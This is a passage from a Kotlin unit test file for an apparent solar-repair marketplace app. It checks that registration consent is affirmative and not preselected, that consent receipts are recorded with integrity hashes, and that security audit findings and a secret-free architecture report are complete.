        val initialConsent = com.example.data.legal.UserConsentAndAuditReportManager.createUnselectedRegistrationConsentState()
        org.junit.Assert.assertFalse("Terms of Service checkbox must NOT be preselected", initialConsent.termsOfServiceAccepted)
        org.junit.Assert.assertFalse("Privacy Policy checkbox must NOT be preselected", initialConsent.privacyPolicyAcknowledged)
        org.junit.Assert.assertFalse("Seller Agreement checkbox must NOT be preselected", initialConsent.sellerAgreementAccepted)
        org.junit.Assert.assertFalse("Optional AI consent checkbox must NOT be preselected", initialConsent.optionalAiDiagnosticHistoryConsent)
        org.junit.Assert.assertFalse("Optional Safety Alerts checkbox must NOT be preselected", initialConsent.optionalSafetyNotificationsConsent)
        org.junit.Assert.assertFalse(initialConsent.isCustomerRegistrationConsentValid)
        org.junit.Assert.assertFalse(initialConsent.isSellerRegistrationConsentValid)

        // 2. Verify registration is rejected if mandatory Terms or Privacy Policy checkboxes are unselected
        val rejectedMissingTerms = com.example.data.legal.UserConsentAndAuditReportManager
            .validateAndRecordCustomerRegistrationConsent(
                userId = "new.customer@solarfix.africa",
                consentState = initialConsent.copy(termsOfServiceAccepted = false, privacyPolicyAcknowledged = true)
            )
        assertTrue("Registration without Terms of Service acceptance must fail", rejectedMissingTerms.isFailure)

        val rejectedMissingPrivacy = com.example.data.legal.UserConsentAndAuditReportManager
            .validateAndRecordCustomerRegistrationConsent(
                userId = "new.customer@solarfix.africa",
                consentState = initialConsent.copy(termsOfServiceAccepted = true, privacyPolicyAcknowledged = false)
            )
        assertTrue("Registration without Privacy Policy acknowledgement must fail", rejectedMissingPrivacy.isFailure)

        // 3. Verify affirmative acceptance records User ID, Accepted Document, Document Version, and Acceptance Timestamp
        val customerId = "affirmative.customer@solarfix.africa"
        val validCustomerConsent = initialConsent.copy(
            termsOfServiceAccepted = true,
            privacyPolicyAcknowledged = true,
            optionalAiDiagnosticHistoryConsent = true,
            optionalSafetyNotificationsConsent = false,
            hasOpenedTermsOfServiceDocument = true,
            hasOpenedPrivacyPolicyDocument = true
        )
        val recordedResult = com.example.data.legal.UserConsentAndAuditReportManager
            .validateAndRecordCustomerRegistrationConsent(
                userId = customerId,
                consentState = validCustomerConsent,
                entryPoint = "Customer Registration"
            )
        assertTrue(recordedResult.isSuccess)
        val receipts = recordedResult.getOrThrow()
        assertEquals(3, receipts.size) // Terms + Privacy + Optional AI Diagnostic Consent

        receipts.forEach { rec ->
            assertEquals(customerId, rec.userId)
            assertTrue(rec.acceptedDocumentName.isNotBlank())
            assertTrue(rec.documentVersion.startsWith("2026.11-"))
            assertTrue(rec.acceptanceTimestampEpochMs > 0L)
            assertTrue(rec.acceptanceTimestampIso.endsWith("Z"))
            assertTrue(rec.affirmativeConsentVerified)
            assertTrue(
                "Cryptographic SHA-256 receipt integrity hash must be valid",
                com.example.data.legal.UserConsentAndAuditReportManager.verifyAcceptanceRecordIntegrity(rec)
            )
        }
        assertTrue(
            com.example.data.legal.UserConsentAndAuditReportManager.hasUserAcceptedCurrentMandatoryDocuments(customerId)
        )

        // 4. Verify Seller Registration consent validation & recording
        val sellerId = "verified.vendor@solarfix.africa"
        val invalidSellerAttempt = com.example.data.legal.UserConsentAndAuditReportManager
            .validateAndRecordSellerRegistrationConsent(
                sellerUserIdOrEmail = sellerId,
                consentState = initialConsent.copy(termsOfServiceAccepted = true, privacyPolicyAcknowledged = true, sellerAgreementAccepted = false)
            )
        assertTrue("Seller registration without Seller Marketplace Agreement must fail", invalidSellerAttempt.isFailure)

        val validSellerAttempt = com.example.data.legal.UserConsentAndAuditReportManager
            .validateAndRecordSellerRegistrationConsent(
                sellerUserIdOrEmail = sellerId,
                consentState = initialConsent.copy(termsOfServiceAccepted = true, privacyPolicyAcknowledged = true, sellerAgreementAccepted = true)
            )
        assertTrue(validSellerAttempt.isSuccess)
        assertEquals(3, validSellerAttempt.getOrThrow().size)

        // 5. Verify Security Audit Report contains all 8 required fields for every vulnerability finding
        val findings = com.example.data.legal.UserConsentAndAuditReportManager.securityAuditFindings
        assertTrue("Security Audit Report must document at least 12 findings", findings.size >= 12)
        findings.forEach { finding ->
            assertTrue(finding.findingId.startsWith("SF-SEC-"))
            assertTrue("1. Vulnerability discovered must not be blank", finding.vulnerabilityDiscovered.isNotBlank())
            org.junit.Assert.assertNotNull("2. Severity level must be present", finding.severityLevel)
            assertTrue("3. Affected component must not be blank", finding.affectedComponent.isNotBlank())
            assertTrue("4. Potential security impact must not be blank", finding.potentialSecurityImpact.isNotBlank())
            assertTrue("5. Recommended correction must not be blank", finding.recommendedCorrection.isNotBlank())
            assertTrue("6. Actual correction implemented must not be blank", finding.actualCorrectionImplemented.isNotBlank())
            assertTrue("7. Verification test performed must not be blank", finding.verificationTestPerformed.isNotBlank())
            assertTrue("8. Remaining security concerns must not be blank", finding.remainingSecurityConcerns.isNotBlank())
            assertTrue(finding.isRemediatedInCodebase)
        }

        // 6. Execute Post-Remediation Security Assessment across all subsystems
        val assessment = com.example.data.legal.UserConsentAndAuditReportManager.runPostRemediationSecurityAssessment()
        assertTrue("All automated post-remediation security checks must pass", assessment.allAutomatedSecurityChecksPassed)
        assertTrue(assessment.mobilePostureCompliant)
        assertTrue(assessment.encryptionAndRlsVerified)
        assertTrue(assessment.fileVaultIsolationVerified)
        assertTrue(assessment.rateLimitingAndFinancialLedgerVerified)
        assertTrue(assessment.affirmativeConsentNonPreselectedVerified)
        assertEquals(findings.size, assessment.remediatedInProjectCount)
        assertTrue(assessment.externalInfrastructureActionItems.isNotEmpty())
    }

    @Test
    fun testArchitectureInspectionSecretRedactionAndContinuousSecurityPosture() {
        val archReport = com.example.data.legal.UserConsentAndAuditReportManager.inspectArchitectureAndGenerateSafeSecurityReport()

        assertTrue(archReport.frontendTechnologies.isNotEmpty())
        assertTrue(archReport.backendAndCloudTechnologies.isNotEmpty())
        assertTrue(archReport.databaseAndAuthArchitecture.isNotEmpty())
        assertTrue(archReport.apiIntegrations.isNotEmpty())
        assertTrue(archReport.environmentAndSecretsSummary.isNotEmpty())
        assertTrue(archReport.hostingAndDeploymentConfig.isNotEmpty())
        assertTrue("BuildConfig must comply with secret exclusion rules", archReport.buildConfigSecretsCompliant)
        assertTrue("Generated report must never expose raw secrets", archReport.zeroSecretsExposedInReport)
        assertTrue(
            "Report must explicitly state that no system is 100% secure and continuous monitoring is required",
            archReport.continuousMonitoringDisclaimer.contains("No software application or cloud infrastructure is 100% secure") &&
                archReport.continuousMonitoringDisclaimer.contains("continuous monitoring")
        )
        assertTrue("Manual configuration instructions must be provided", archReport.manualConfigurationInstructions.size >= 6)
    }
}



